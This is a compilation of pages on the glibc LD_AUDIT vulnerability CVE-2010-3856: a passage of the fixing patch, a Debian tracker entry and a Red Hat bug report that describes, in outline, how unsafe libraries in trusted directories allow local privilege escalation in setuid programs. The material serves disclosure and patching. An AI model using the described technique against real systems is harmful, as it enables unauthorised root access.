+++ b/elf/dl-deps.c
@@ -62,7 +62,7 @@ openaux (void *a)
 {
   struct openaux_args *args = (struct openaux_args *) a;

-  args->aux = _dl_map_object (args->map, args->name, 0,
+  args->aux = _dl_map_object (args->map, args->name,
 			      (args->map->l_type == lt_executable
 			       ? lt_library : args->map->l_type),
 			      args->trace_mode, args->open_mode,
diff --git a/elf/dl-load.c b/elf/dl-load.c
index 776f7e4..9ab3520 100644
--- a/elf/dl-load.c
+++ b/elf/dl-load.c
@@ -1808,7 +1808,7 @@ open_verify (const char *name, struct filebuf *fbp, struct link_map *loader,
    if MAY_FREE_DIRS is true.  */

 static int
-open_path (const char *name, size_t namelen, int preloaded,
+open_path (const char *name, size_t namelen, int secure,
 	   struct r_search_path_struct *sps, char **realname,
 	   struct filebuf *fbp, struct link_map *loader, int whatcode,
 	   bool *found_other_class)
@@ -1890,7 +1890,7 @@ open_path (const char *name, size_t namelen, int preloaded,
 	  /* Remember whether we found any existing directory.  */
 	  here_any |= this_dir->status[cnt] != nonexisting;

-	  if (fd != -1 && __builtin_expect (preloaded, 0)
+	  if (fd != -1 && __builtin_expect (secure, 0)
 	      && INTUSE(__libc_enable_secure))
 	    {
 	      /* This is an extra security effort to make sure nobody can
@@ -1959,7 +1959,7 @@ open_path (const char *name, size_t namelen, int preloaded,

 struct link_map *
 internal_function
-_dl_map_object (struct link_map *loader, const char *name, int preloaded,
+_dl_map_object (struct link_map *loader, const char *name,
 		int type, int trace_mode, int mode, Lmid_t nsid)
 {
   int fd;
@@ -2063,7 +2063,8 @@ _dl_map_object (struct link_map *loader, const char *name, int preloaded,
 	  for (l = loader; l; l = l->l_loader)
 	    if (cache_rpath (l, &l->l_rpath_dirs, DT_RPATH, "RPATH"))
 	      {
-		fd = open_path (name, namelen, preloaded, &l->l_rpath_dirs,
+		fd = open_path (name, namelen, mode & __RTLD_SECURE,
+				&l->l_rpath_dirs,
 				&realname, &fb, loader, LA_SER_RUNPATH,
 				&found_other_class);
 		if (fd != -1)
@@ -2078,14 +2079,15 @@ _dl_map_object (struct link_map *loader, const char *name, int preloaded,
 	      && main_map != NULL && main_map->l_type != lt_loaded
 	      && cache_rpath (main_map, &main_map->l_rpath_dirs, DT_RPATH,
 			      "RPATH"))
-	    fd = open_path (name, namelen, preloaded, &main_map->l_rpath_dirs,
+	    fd = open_path (name, namelen, mode & __RTLD_SECURE,
+			    &main_map->l_rpath_dirs,
 			    &realname, &fb, loader ?: main_map, LA_SER_RUNPATH,
 			    &found_other_class);
 	}

       /* Try the LD_LIBRARY_PATH environment variable.  */
       if (fd == -1 && env_path_list.dirs != (void *) -1)
-	fd = open_path (name, namelen, preloaded, &env_path_list,
+	fd = open_path (name, namelen, mode & __RTLD_SECURE, &env_path_list,
 			&realname, &fb,
 			loader ?: GL(dl_ns)[LM_ID_BASE]._ns_loaded,
 			LA_SER_LIBPATH, &found_other_class);
@@ -2094,12 +2096,12 @@ _dl_map_object (struct link_map *loader, const char *name, int preloaded,
       if (fd == -1 && loader != NULL
 	  && cache_rpath (loader, &loader->l_runpath_dirs,
 			  DT_RUNPATH, "RUNPATH"))
-	fd = open_path (name, namelen, preloaded,
+	fd = open_path (name, namelen, mode & __RTLD_SECURE,
 			&loader->l_runpath_dirs, &realname, &fb, loader,
 			LA_SER_RUNPATH, &found_other_class);

       if (fd == -1
-	  && (__builtin_expect (! preloaded, 1)
+	  && (__builtin_expect (! (mode & __RTLD_SECURE), 1)
 	      || ! INTUSE(__libc_enable_secure)))
 	{
 	  /* Check the list of libraries in the file /etc/ld.so.cache,
@@ -2165,7 +2167,7 @@ _dl_map_object (struct link_map *loader, const char *name, int preloaded,
 	  && ((l = loader ?: GL(dl_ns)[nsid]._ns_loaded) == NULL
 	      || __builtin_expect (!(l->l_flags_1 & DF_1_NODEFLIB), 1))
 	  && rtld_search_dirs.dirs != (void *) -1)
-	fd = open_path (name, namelen, preloaded, &rtld_search_dirs,
+	fd = open_path (name, namelen, mode & __RTLD_SECURE, &rtld_search_dirs,
 			&realname, &fb, l, LA_SER_DEFAULT, &found_other_class);

       /* Add another newline when we are tracing the library loading.  */
diff --git a/elf/dl-open.c b/elf/dl-open.c
index c394b3f..cf8e8cc 100644
--- a/elf/dl-open.c
+++ b/elf/dl-open.c
@@ -223,7 +223,7 @@ dl_open_worker (void *a)

   /* Load the named object.  */
   struct link_map *new;
-  args->map = new = _dl_map_object (call_map, file, 0, lt_loaded, 0,
+  args->map = new = _dl_map_object (call_map, file, lt_loaded, 0,
 				    mode | __RTLD_CALLMAP, args->nsid);

   /* If the pointer returned is NULL this means the RTLD_NOLOAD flag is
diff --git a/elf/rtld.c b/elf/rtld.c
index 201c9cf..4a8cee8 100644
--- a/elf/rtld.c
+++ b/elf/rtld.c
@@ -587,7 +587,6 @@ struct map_args
   /* Argument to map_doit.  */
   char *str;
   struct link_map *loader;
-  int is_preloaded;
   int mode;
   /* Return value of map_doit.  */
   struct link_map *map;
@@ -625,16 +624,17 @@ static void
 map_doit (void *a)
 {
   struct map_args *args = (struct map_args *) a;
-  args->map = _dl_map_object (args->loader, args->str,
-			      args->is_preloaded, lt_library, 0, args->mode,
-			      LM_ID_BASE);
+  args->map = _dl_map_object (args->loader, args->str, lt_library, 0,
+			      args->mode, LM_ID_BASE);
 }

 static void
 dlmopen_doit (void *a)
 {
   struct dlmopen_args *args = (struct dlmopen_args *) a;
-  args->map = _dl_open (args->fname, RTLD_LAZY | __RTLD_DLOPEN | __RTLD_AUDIT,
+  args->map = _dl_open (args->fname,
+			(RTLD_LAZY | __RTLD_DLOPEN | __RTLD_AUDIT
+			 | __RTLD_SECURE),
 			dl_main, LM_ID_NEWLM, _dl_argc, INTUSE(_dl_argv),
 			__environ);
 }
@@ -804,8 +804,7 @@ do_preload (char *fname, struct link_map *main_map, const char *where)

   args.str = fname;
   args.loader = main_map;
-  args.is_preloaded = 1;
-  args.mode = 0;
+  args.mode = __RTLD_SECURE;

   unsigned int old_nloaded = GL(dl_ns)[LM_ID_BASE]._ns_nloaded;

@@ -1050,7 +1049,6 @@ of this helper program; chances are you did not intend to run this program.\n\

 	  args.str = rtld_progname;
 	  args.loader = NULL;
-	  args.is_preloaded = 0;
 	  args.mode = __RTLD_OPENEXEC;
 	  (void) _dl_catch_error (&objname, &err_str, &malloced, map_doit,
 				  &args);
@@ -1062,7 +1060,7 @@ of this helper program; chances are you did not intend to run this program.\n\
       else
 	{
 	  HP_TIMING_NOW (start);
-	  _dl_map_object (NULL, rtld_progname, 0, lt_library, 0,
+	  _dl_map_object (NULL, rtld_progname, lt_library, 0,
 			  __RTLD_OPENEXEC, LM_ID_BASE);
 	  HP_TIMING_NOW (stop);

diff --git a/include/dlfcn.h b/include/dlfcn.h
index a67426d..af92483 100644
--- a/include/dlfcn.h
+++ b/include/dlfcn.h
@@ -9,6 +9,7 @@
 #define __RTLD_OPENEXEC	0x20000000
 #define __RTLD_CALLMAP	0x10000000
 #define __RTLD_AUDIT	0x08000000
+#define __RTLD_SECURE	0x04000000 /* Apply additional security checks.  */

 #define __LM_ID_CALLER	-2

diff --git a/sysdeps/generic/ldsodefs.h b/sysdeps/generic/ldsodefs.h
index fcc943b..fa4b6b2 100644
--- a/sysdeps/generic/ldsodefs.h
+++ b/sysdeps/generic/ldsodefs.h
@@ -824,11 +824,9 @@ extern void _dl_receive_error (receiver_fct fct, void (*operate) (void *),

 /* Open the shared object NAME and map in its segments.
    LOADER's DT_RPATH is used in searching for NAME.
-   If the object is already opened, returns its existing map.
-   For preloaded shared objects PRELOADED is set to a non-zero
-   value to allow additional security checks.  */
+   If the object is already opened, returns its existing map.  */
 extern struct link_map *_dl_map_object (struct link_map *loader,
-					const char *name, int preloaded,
+					const char *name,
 					int type, int trace_mode, int mode,
 					Lmid_t nsid)
      internal_function attribute_hidden;
--
1.7.2.3

--
Andreas Schwab, schwab@redhat.com
GPG Key fingerprint = D4E8 DBE3 3813 BB5D FA84  5EC7 45C6 250E 6F00 984E
"And now for something completely different."

```

---

* **Follow-Ups**:
  + **[Re: [PATCH] Require suid bit on audit objects in privileged programs](msg00011.html)**
    - *From:* Roland McGrath

| Index Nav: | [[Date Index](index.html#00010)] [[Subject Index](subjects.html#00010)] [[Author Index](authors.html#00010)] [[Thread Index](threads.html#00010)] | |
| --- | --- | --- |
| Message Nav: | [[Date Prev](msg00009.html)] [[Date Next](msg00011.html)] | [[Thread Prev](msg00009.html)] [[Thread Next](msg00011.html)] |



=== Content from security-tracker.debian.org_0f2b6651_20250126_124107.html ===

# CVE-2010-3856

| **Name** | CVE-2010-3856 |
| --- | --- |
| **Description** | ld.so in the GNU C Library (aka glibc or libc6) before 2.11.3, and 2.12.x before 2.12.2, does not properly restrict use of the LD\_AUDIT environment variable to reference dynamic shared objects (DSOs) as audit objects, which allows local users to gain privileges by leveraging an unsafe DSO located in a trusted library directory, as demonstrated by libpcprofile.so. |
| **Source** | [CVE](https://www.cve.org/CVERecord?id=CVE-2010-3856) (at [NVD](https://nvd.nist.gov/vuln/detail/CVE-2010-3856); [CERT](https://www.kb.cert.org/vuls/byid?searchview=&query=CVE-2010-3856), [LWN](https://lwn.net/Search/DoSearch?words=CVE-2010-3856), [oss-sec](https://marc.info/?l=oss-security&s=CVE-2010-3856), [fulldisc](https://marc.info/?l=full-disclosure&s=CVE-2010-3856), [Red Hat](https://bugzilla.redhat.com/show_bug.cgi?id=CVE-2010-3856), [Ubuntu](https://people.canonical.com/~ubuntu-security/cve/CVE-2010-3856), [Gentoo](https://bugs.gentoo.org/show_bug.cgi?id=CVE-2010-3856), SUSE [bugzilla](https://bugzilla.suse.com/show_bug.cgi?id=CVE-2010-3856)/[CVE](https://www.suse.com/security/cve/CVE-2010-3856/), GitHub [advisories](https://github.com/advisories?query=CVE-2010-3856)/[code](https://github.com/search?type=Code&q=%22CVE-2010-3856%22)/[issues](https://github.com/search?type=Issues&q=%22CVE-2010-3856%22), [web search](https://duckduckgo.com/html?q=%22CVE-2010-3856%22), [more](https://oss-security.openwall.org/wiki/vendors)) |
| **References** | [DSA-2122-1](/tracker/DSA-2122-1), [DSA-2122-2](/tracker/DSA-2122-2) |
| **Debian Bugs** | [600667](https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=600667) |

## Vulnerable and fixed packages

The table below lists information on source packages.

| Source Package | Release | Version | Status |
| --- | --- | --- | --- |
| [glibc](/tracker/source-package/glibc) ([PTS](https://tracker.debian.org/pkg/glibc)) | bullseye | 2.31-13+deb11u11 | fixed |
|  | bullseye (security) | 2.31-13+deb11u10 | fixed |
|  | bookworm | 2.36-9+deb12u9 | fixed |
|  | bookworm (security) | 2.36-9+deb12u7 | fixed |
|  | trixie | 2.40-5 | fixed |
|  | sid | 2.40-6 | fixed |

The information below is based on the following data on fixed versions.

| Package | Type | Release | Fixed Version | Urgency | Origin | Debian Bugs |
| --- | --- | --- | --- | --- | --- | --- |
| [eglibc](/tracker/source-package/eglibc) | source | (unstable) | 2.11.2-8 |  |  | [600667](https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=600667) |
| [glibc](/tracker/source-package/glibc) | source | lenny | 2.7-18lenny7 |  | [DSA-2122-2](/tracker/DSA-2122-2) |  |
| [glibc](/tracker/source-package/glibc) | source | (unstable) | 2.11.2-8 |  |  |  |

---

Search for package or bug name:  [Reporting problems](/tracker/data/report)

[Home](/tracker/) - [Debian Security](https://www.debian.org/security/) - [Source](https://salsa.debian.org/security-tracker-team/security-tracker/blob/master/bin/tracker_service.py) [(Git)](https://salsa.debian.org/security-tracker-team/security-tracker)



=== Content from bugzilla.redhat.com_351126e3_20250126_124111.html ===


* Login
  + Log in using an SSO provider:- [Fedora Account System](saml2_login.cgi?idp=Fedora%20Account%20System&target=show_bug.cgi%3Fid%3D645672)
    - [Red Hat Associate](saml2_login.cgi?idp=Red%20Hat%20Associate&target=show_bug.cgi%3Fid%3D645672)
    - [Red Hat Customer](saml2_login.cgi?idp=Red%20Hat%20Customer&target=show_bug.cgi%3Fid%3D645672)+ Login using a Red Hat Bugzilla account
  + Forgot Password
  + [Create an Account](createaccount.cgi)

Red Hat Bugzilla – Bug 645672

* [Home](./)
* [New](enter_bug.cgi)
* Search
  + [Simple Search](query.cgi?format=specific)
  + [Advanced Search](query.cgi?format=advanced)
* My Links
  + [Browse](describecomponents.cgi)
  + [Requests](request.cgi)
  + Reports
  + Current State
    - [Search](query.cgi)
    - [Tabular reports](query.cgi?format=report-table)
    - [Graphical reports](query.cgi?format=report-graph)
    - [Duplicates](duplicates.cgi)
  + Other Reports
    - [User Changes](https://bugzilla.redhat.com/page.cgi?id=user_activity.html)
  + Plotly Reports
    - [Bug Status](https://bugzilla.redhat.com/page.cgi?id=bug_status.html)
    - [Bug Severity](https://bugzilla.redhat.com/page.cgi?id=bug_severity.html)
    - [Non-Defaults](https://bugzilla.redhat.com/page.cgi?id=non_defaults.html)
* [Product Dashboard](page.cgi?id=productdashboard.html)

- Help
  * [Page Help!](docs/en/html/using/understanding.html)
  * [Bug Writing Guidelines](page.cgi?id=bug-writing.html)
  * [What's new](page.cgi?id=whats-new.html)
  * [Browser Support Policy](https://access.redhat.com/help/browsers)
  * [5.0.4.rh103 Release notes](page.cgi?id=release-notes.html)
  * [FAQ](page.cgi?id=faq.html)
  * [Guides index](docs/en/html/index.html)
  * [User guide](docs/en/html/using/index.html)
  * [Web Services](docs/en/html/integrating/api/Bugzilla/WebService/Bug.html)
  * [Contact](page.cgi?id=redhat/contact.html)
  * [Legal](page.cgi?id=terms-conditions.html)
- [[?]](page.cgi?id=quicksearch.html "Quicksearch Help")

This site requires JavaScript to be enabled to function correctly, please enable it.

[**Bug 645672**](show_bug.cgi?id=645672)
(CVE-2010-3856)
- [CVE-2010-3856](https://access.redhat.com/security/cve/CVE-2010-3856) glibc: ld.so arbitrary DSO loading via LD\_AUDIT in setuid/setgid programs

[Summary:](page.cgi?id=fields.html#short_desc "The bug summary is a short sentence which succinctly describes what the bug is about.")
CVE-2010-3856 glibc: ld.so arbitrary DSO loading via LD\_AUDIT in setuid/setgi...

| | [Keywords](describekeywords.cgi): | Security | | --- | --- | | [Status](page.cgi?id=fields.html#bug_status): | CLOSED ERRATA | | [Alias:](page.cgi?id=fields.html#alias "A short, unique name assigned to a bug in order to assist with looking it up and referring to it in other places in Bugzilla.") | CVE-2010-3856 | | [Product:](describecomponents.cgi "Bugs are categorised into Products and Components. Select a Classification to narrow down this list.") | Security Response | | [Classification:](page.cgi?id=fields.html#classification "Bugs are categorised into Classifications, Products and Components. classifications is the top-level categorisation.") | Other | | [Component:](describecomponents.cgi?product=Security Response "Components are second-level categories; each belongs to a particular Product. Select a Product to narrow down this list.") | vulnerability | | [Sub Component:](page.cgi?id=fields.html#rh_sub_components "The sub component of a specific component") | --- | | [Version:](page.cgi?id=fields.html#version "The version field defines the version of the software the bug was found in.") | unspecified | | [Hardware:](page.cgi?id=fields.html#rep_platform "The hardware platform the bug was observed on. Note: When searching, selecting the option \"All\" only finds bugs whose value for this field is literally the word \"All\".") | All | | [OS:](page.cgi?id=fields.html#op_sys "The operating system the bug was observed on. Note: When searching, selecting the option \"All\" only finds bugs whose value for this field is literally the word \"All\".") | Linux | | [Priority:](page.cgi?id=fields.html#priority) | high | | [Severity:](page.cgi?id=fields.html#bug_severity) | high | | [Target Milestone:](page.cgi?id=fields.html#target_milestone "The Target Milestone field is used to define when the engineer the bug is assigned to expects to fix it.") | --- | | [Assignee:](page.cgi?id=fields.html#assigned_to "The person in charge of resolving the bug.") | Red Hat Product Security | | [QA Contact:](page.cgi?id=fields.html#qa_contact "The person responsible for confirming this bug if it is unconfirmed, and for verifying the fix once the bug has been resolved.") |  | | [Docs Contact:](page.cgi?id=fields.html#docs_contact "The person responsible for documenting once the bug has been resolved.") |  | | [URL:](page.cgi?id=fields.html#bug_file_loc "Bugs can have a URL associated with them - for example, a pointer to a web site where the problem is seen.") |  | | [Whiteboard:](page.cgi?id=fields.html#status_whiteboard "Each bug has a free-form single line text entry box for adding tags and status information.") |  | | [Depends On:](page.cgi?id=fields.html#dependson "The bugs listed here must be resolved before this bug can be resolved.") | [645677](show_bug.cgi?id=645677) [645678](show_bug.cgi?id=645678) [645679](show_bug.cgi?id=645679) [645680](show_bug.cgi?id=645680) [645875](show_bug.cgi?id=645875 "CLOSED ERRATA - CVE-2010-3856 glibc: ld.so arbitrary DSO loading via LD_AUDIT in setuid/setgid programs [fedora-all]") | | [Blocks:](page.cgi?id=fields.html#blocked "This bug must be resolved before the bugs listed in this field can be resolved.") |  | | TreeView+ | [depends on](buglist.cgi?bug_id=645672&bug_id_type=anddependson&format=tvp) / [blocked](buglist.cgi?bug_id=645672&bug_id_type=andblocked&format=tvp&tvp_dir=blocked) |  | |  | | [Reported:](page.cgi?id=fields.html#reporter) | 2010-10-22 08:28 UTC by Petr Matousek | | --- | --- | | [Modified:](page.cgi?id=fields.html#modified) | 2023-05-11 15:26 UTC ([History](show_activity.cgi?id=645672)) | | [CC List:](page.cgi?id=fields.html#cclist) | 15 users (show)  bob69xxx csieh ebachalo fweimer jakub jeder jlieskov kent nixon pasteur rcvalle rdassen roland schwab security-response-team | | Fixed In Version: |  | | | Doc Type: | Bug Fix | | | Doc Text: |  | | | Clone Of: |  | | | Environment: |  | | | Last Closed: | 2010-11-11 08:12:40 UTC | | | Embargoed: |  | | |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| --- | | |

| | Attachments | [(Terms of Use)](page.cgi?id=terms-conditions.html) | | | --- | --- | --- | |  | | |    Links | System | ID | Private | Priority | Status | Summary | Last Updated | | Red Hat Product Errata | [RHSA-2010:0793](https://access.redhat.com/errata/RHSA-2010%3A0793) | 0 | normal | SHIPPED\_LIVE | Important: glibc security update | 2010-10-25 18:54:26 UTC | | Red Hat Product Errata | [RHSA-2010:0872](https://access.redhat.com/errata/RHSA-2010%3A0872) | 0 | normal | SHIPPED\_LIVE | Important: glibc security and bug fix update | 2010-11-10 12:10:56 UTC | |  |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |

| [Description](show_bug.cgi?id=645672#c0)  Petr Matousek    2010-10-22 08:28:34 UTC  ``` Tavis Ormandy pointed out that glibc does not properly sanitize DSOs that are loaded using LD_AUDIT facility. Tavis quoted:    In order to be preloaded during the execution of a privileged program, a   library must be setuid and in the trusted library search path. This is a   reasonable design, in order to be loaded a system administrator must brand   a library as safe before it will be loaded across privilege boundaries.    This allows developers who design their programs to operate safely while   running as setuid are able to do so. The same conditions do not apply to   LD_AUDIT, which will load an arbitrary DSOs, regardless of whether it   has been designed to operate safely or not.  Tavis found out that by exploiting unsafely designed DSO constructors in trusted directories it is possible to achieve privilege escalation.  Acknowledgements:  Red Hat would like to thank Ben Hawkes and Tavis Ormandy for reporting this issue.   ```  [Comment 12](show_bug.cgi?id=645672#c12)  Petr Matousek    2010-10-22 17:02:38 UTC  ``` Reference:  <http://seclists.org/fulldisclosure/2010/Oct/344>   ```  [Comment 13](show_bug.cgi?id=645672#c13)  Petr Matousek    2010-10-22 18:05:31 UTC  ``` Created glibc tracking bugs for this issue  Affects: fedora-all [[bug 645875](show_bug.cgi?id=645875 "CLOSED ERRATA - CVE-2010-3856 glibc: ld.so arbitrary DSO loading via LD_AUDIT in setuid/setgid programs [fedora-all]")]   ```  [Comment 14](show_bug.cgi?id=645672#c14)  Roberto Yokota    2010-10-22 18:07:56 UTC  ``` Andreas Patch:  <http://sourceware.org/ml/libc-hacker/2010-10/msg00010.html>  Thanks,  Roberto Yokota   ```  [Comment 15](show_bug.cgi?id=645672#c15)  Petr Matousek    2010-10-23 09:40:32 UTC  ``` This issue did not affect the versions of glibc package as shipped with Red Hat Enterprise Linux 3 and 4 as these do not implement Auditing API for the dynamic linker.   ```  [Comment 18](show_bug.cgi?id=645672#c18)  errata-xmlrpc    2010-10-25 18:54:32 UTC  ``` This issue has been addressed in following products:    Red Hat Enterprise Linux 5  Via RHSA-2010:0793 <https://rhn.redhat.com/errata/RHSA-2010-0793.html>   ```  [Comment 19](show_bug.cgi?id=645672#c19)  errata-xmlrpc    2010-11-10 18:57:35 UTC  ``` This issue has been addressed in following products:    Red Hat Enterprise Linux 6  Via RHSA-2010:0872 <https://rhn.redhat.com/errata/RHSA-2010-0872.html>   ``` |  |
| --- | --- |

---

| Note You need to [log in](show_bug.cgi?id=645672&GoAheadAndLogIn=1) before you can comment on or make changes to this bug. |
| --- |

---

[Privacy](page.cgi?id=redhat/privacy.html)
[Contact](page.cgi?id=redhat/contact.html)
[FAQ](page.cgi?id=faq.html)
[Legal](page.cgi?id=terms-conditions.html)



=== Content from www.redhat.com_ac5c0a68_20250126_124113.html ===


[Skip to navigation](#pfe-navigation)
[Skip to main content](#cp-main)
### Utilities

* [Subscriptions](https://access.redhat.com/management/)
* [Downloads](https://access.redhat.com/downloads/)
* [Red Hat Console](//console.redhat.com/)
* [Get Support](https://access.redhat.com/support/)

[![Red Hat Customer Portal](https://access.redhat.com/chrome_themes/nimbus/img/red-hat-customer-portal.svg)](https://access.redhat.com/)

* [Subscriptions](https://access.redhat.com/management/)
* [Downloads](https://access.redhat.com/downloads/)
* [Red Hat Console](//console.redhat.com/)
* [Get Support](https://access.redhat.com/support/)
* [Products](https://access.redhat.com/)
  ### Top Products

  + [Red Hat Enterprise Linux](https://access.redhat.com/products/red-hat-enterprise-linux/)
  + [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform)
  + [Red Hat Ansible Automation Platform](https://access.redhat.com/products/red-hat-ansible-automation-platform/)
  [All Products](https://access.redhat.com/products/)

  ### Downloads and Containers

  + [Downloads](https://access.redhat.com/downloads/)
  + [Packages](https://access.redhat.com/downloads/content/package-browser)
  + [Containers](https://catalog.redhat.com/software/containers/explore/)
  ### Top Resources

  + [Documentation](//docs.redhat.com/)
  + [Product Life Cycles](https://access.redhat.com/product-life-cycles/)
  + [Product Compliance](https://access.redhat.com/articles/1202803)
  + [Errata](https://access.redhat.com/errata/)
* [Knowledge](https://access.redhat.com/labs/)
  ### Red Hat Knowledge Center

  + [Knowledgebase Solutions](https://access.redhat.com/search/?q=*&p=1&rows=10&documentKind=Solution)
  + [Knowledgebase Articles](https://access.redhat.com/search/?q=*&p=1&rows=10&documentKind=Article)
  + [Customer Portal Labs](https://access.redhat.com/labs/)
  + [Errata](https://access.redhat.com/errata/)
  ### Top Product Docs

  + [Red Hat Enterprise Linux](//docs.redhat.com/en/documentation/red_hat_enterprise_linux/)
  + [Red Hat OpenShift](//docs.redhat.com/en/documentation/openshift_container_platform/)
  + [Red Hat Ansible Automation Platform](//docs.redhat.com/en/documentation/red_hat_ansible_automation_platform/)
  [All Product Docs](//docs.redhat.com/en/products)

  ### [Training and Certification](//www.redhat.com/en/services/training-and-certification)

  + [About](//www.redhat.com/en/services/training-and-certification)
  + [Course Index](//www.redhat.com/en/services/training/all-courses-exams)
  + [Certification Index](//www.redhat.com/en/services/certifications)
  + [Skill Assessment](//skills.ole.redhat.com/)
* [Security](https://access.redhat.com/security/)
  ### [Red Hat Product Security Center](https://access.redhat.com/security)

  + [Security Updates](https://access.redhat.com/security)
  + [Security Advisories](https://access.redhat.com/security/security-updates/#/security-advisories)
  + [Red Hat CVE Database](https://access.redhat.com/security/security-updates/#/cve)
  + [Errata](https://access.redhat.com/errata/)
  ### References

  + [Security Bulletins](https://access.redhat.com/security/vulnerabilities)
  + [Security Measurement](https://www.redhat.com/security/data/metrics/)
  + [Severity Ratings](https://access.redhat.com/security/updates/classification/)
  + [Security Data](https://access.redhat.com/security/data)
  ### Top Resources

  + [Security Labs](https://access.redhat.com/security/security-updates/#/security-labs)
  + [Backporting Policies](https://access.redhat.com/security/updates/backporting/)
  + [Security Blog](//redhat.com/en/blog/channel/security)
* [Support](https://access.redhat.com/support/)
  ### [Red Hat Support](https://access.redhat.com/support/)

  + [Support Cases](https://access.redhat.com/support/cases/)
  + [Troubleshoot](https://access.redhat.com/support/cases/#/troubleshoot)
  + [Get Support](https://access.redhat.com/support/)
  + [Contact Red Hat Support](https://access.redhat.com/support/contact/)
  ### [Red Hat Community Support](https://access.redhat.com/community)

  + [Customer Portal Community](https://access.redhat.com/community/)
  + [Community Discussions](https://access.redhat.com/discussions/)
  + [Red Hat Accelerator Program](https://access.redhat.com/accelerators/)
  ### Top Resources

  + [Product Life Cycles](https://access.redhat.com/product-life-cycles/)
  + [Customer Portal Labs](https://access.redhat.com/labs/)
  + [Red Hat JBoss Supported Configurations](https://access.redhat.com/support/configurations/jboss)
  + [Red Hat Insights](https://cloud.redhat.com/insights)

Or [troubleshoot an issue](/support/cases/#/troubleshoot).

English

## Select Your Language

* [English](https://access.redhat.com/changeLanguage?language=en)
* [Français](https://access.redhat.com/changeLanguage?language=fr)
* [한국어](https://access.redhat.com/changeLanguage?language=ko)
* [日本語](https://access.redhat.com/changeLanguage?language=ja)
* [中文 (中国)](https://access.redhat.com/changeLanguage?language=zh_CN)

### Infrastructure and Management

* [Red Hat Enterprise Linux](https://access.redhat.com/products/red-hat-enterprise-linux/)
* [Red Hat Satellite](https://access.redhat.com/products/red-hat-satellite/)
* [Red Hat Subscription Management](https://access.redhat.com/products/red-hat-subscription-management/)
* [Red Hat Insights](https://access.redhat.com/products/red-hat-insights/)
* [Red Hat Ansible Automation Platform](https://access.redhat.com/products/red-hat-ansible-automation-platform/)
### Cloud Computing

* [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform)
* [Red Hat OpenStack Platform](https://access.redhat.com/products/red-hat-openstack-platform/)
* [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform/)
* [Red Hat OpenShift AI](https://access.redhat.com/products/red-hat-openshift-ai/)
* [Red Hat OpenShift Dedicated](https://access.redhat.com/products/openshift-dedicated-red-hat/)
* [Red Hat Advanced Cluster Security for Kubernetes](https://access.redhat.com/products/red-hat-advanced-cluster-security-for-kubernetes/)
* [Red Hat Advanced Cluster Management for Kubernetes](https://access.redhat.com/products/red-hat-advanced-cluster-management-for-kubernetes/)
* [Red Hat Quay](https://access.redhat.com/products/red-hat-quay/)
* [Red Hat OpenShift Dev Spaces](https://access.redhat.com/products/red-hat-openshift-dev-spaces)
* [Red Hat OpenShift Service on AWS](https://access.redhat.com/products/red-hat-openshift-service-aws)
### Storage

* [Red Hat Gluster Storage](https://access.redhat.com/products/red-hat-storage/)
* [Red Hat Hyperconverged Infrastructure](https://access.redhat.com/products/red-hat-hyperconverged-infrastructure/)
* [Red Hat Ceph Storage](https://access.redhat.com/products/red-hat-ceph-storage/)
* [Red Hat OpenShift Data Foundation](https://access.redhat.com/products/red-hat-openshift-data-foundation)
### Runtimes

* [Red Hat Runtimes](https://access.redhat.com/products/red-hat-runtimes/)
* [Red Hat JBoss Enterprise Application Platform](https://access.redhat.com/products/red-hat-jboss-enterprise-application-platform/)
* [Red Hat Data Grid](https://access.redhat.com/products/red-hat-data-grid/)
* [Red Hat JBoss Web Server](https://access.redhat.com/products/red-hat-jboss-web-server/)
* [Red Hat build of Keycloak](https://access.redhat.com/products/red-hat-build-of-keycloak/)
* [Red Hat support for Spring Boot](https://access.redhat.com/products/spring-boot/)
* [Red Hat build of Node.js](https://access.redhat.com/products/nodejs/)
* [Red Hat build of Quarkus](https://access.redhat.com/products/quarkus/)
### Integration and Automation

* [Red Hat Application Foundations](https://access.redhat.com/products/red-hat-application-foundations/)
* [Red Hat Fuse](https://access.redhat.com/products/red-hat-fuse/)
* [Red Hat AMQ](https://access.redhat.com/products/red-hat-amq/)
* [Red Hat 3scale API Management](https://access.redhat.com/products/red-hat-3scale/)

[All Products](https://access.redhat.com/products/)

**We're sorry but cve-details doesn't work properly without JavaScript enabled. Please enable it to continue.**

[![Red Hat](https://static.redhat.com/libs/redhat/brand-assets/2/corp/logo--on-dark.svg)](https://redhat.com/en)
[X (formerly Twitter)](https://twitter.com/RedHat)
### Quick Links

* [Downloads](https://access.redhat.com/downloads/)
* [Subscriptions](https://access.redhat.com/management)
* [Support Cases](https://access.redhat.com/support)
* [Customer Service](https://access.redhat.com/support/customer-service)
* [Product Documentation](//docs.redhat.com/)

### Help

* [Contact Us](https://access.redhat.com/support/contact/)
* [Customer Portal FAQ](https://access.redhat.com/articles/33844)
* [Log-in Assistance](https://access.redhat.com/help/login_assistance)

### Site Info

* [Trust Red Hat](https://www.redhat.com/en/trust)
* [Browser Support Policy](https://www.redhat.com/en/about/browser-support)
* [Accessibility](https://www.redhat.com/en/about/digital-accessibility)
* [Awards and Recognition](https://access.redhat.com/recognition/)
* [Colophon](https://access.redhat.com/help/colophon/)

### Related Sites

* [redhat.com](https://www.redhat.com/)
* [developers.redhat.com](http://developers.redhat.com/)
* [connect.redhat.com](https://connect.redhat.com/)
* [cloud.redhat.com](https://cloud.redhat.com/)

### Red Hat legal and privacy links

* [About Red Hat](https://redhat.com/en/about/company)
* [Jobs](https://redhat.com/en/jobs)
* [Events](https://redhat.com/en/events)
* [Locations](https://redhat.com/en/about/office-locations)
* [Contact Red Hat](https://redhat.com/en/contact)
* [Red Hat Blog](https://redhat.com/en/blog)
* [Diversity, equity, and inclusion](https://redhat.com/en/about/our-culture/diversity-equity-inclusion)
